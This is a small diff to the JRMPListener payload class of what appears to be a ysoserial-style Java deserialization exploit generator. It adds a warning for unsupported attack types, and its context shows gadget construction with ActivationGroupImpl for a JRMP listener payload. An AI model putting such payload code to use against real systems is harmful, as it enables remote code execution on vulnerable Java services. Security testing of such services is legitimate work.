@@ -41,6 +41,16 @@ public class JRMPListener extends PayloadRunner implements ObjectPayload<Unicast
 	// federicodotta - Not applicable
 
     public UnicastRemoteObject getObject ( final String command, String attackType) throws Exception {
+    	
+		if(!attackType.equals("exec_global")) {
+	    	
+	    	System.err.println("**********************************");
+	    	System.err.println(attackType + " not supported. Defaulting to exec_global");
+	    	System.err.println("**********************************");
+	    	System.err.println();
+	    	
+	    }    	
+    	
         int jrmpPort = Integer.parseInt(command);
         UnicastRemoteObject uro = Reflections.createWithConstructor(ActivationGroupImpl.class, RemoteObject.class, new Class[] {
             RemoteRef.class
